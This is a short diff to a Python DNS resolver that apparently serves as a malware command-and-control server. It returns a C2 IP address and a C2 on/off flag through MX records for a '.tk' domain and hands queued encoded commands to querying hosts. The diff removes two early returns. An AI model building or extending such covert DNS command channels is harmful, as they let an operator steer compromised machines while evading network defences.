@@ -36,14 +36,12 @@ class MemeResolver:
         if qname == "c2.a.linuxmailexchange.tk.":
             reply.add_answer(*RR.fromZone("c2.linuxmailexchange.tk. 60 IN MX 10 "+self.c2IP))
             print("Providing C2 name")
-            return reply
         if qname == "c2e.a.linuxmailexchange.tk.":
             if self.c2enabled:
                 reply.add_answer(*RR.fromZone("c2e.a.linuxmailexchange.tk. 60 IN MX 10 yes."))
             else:
                 reply.add_answer(*RR.fromZone("c2e.a.linuxmailexchange.tk. 60 IN MX 10 no."))
             print("Providing C2 authorization")
-            return reply
 
         if qname in self.waitingCommands:
             response = encodeCmd(self.waitingCommands[qname])
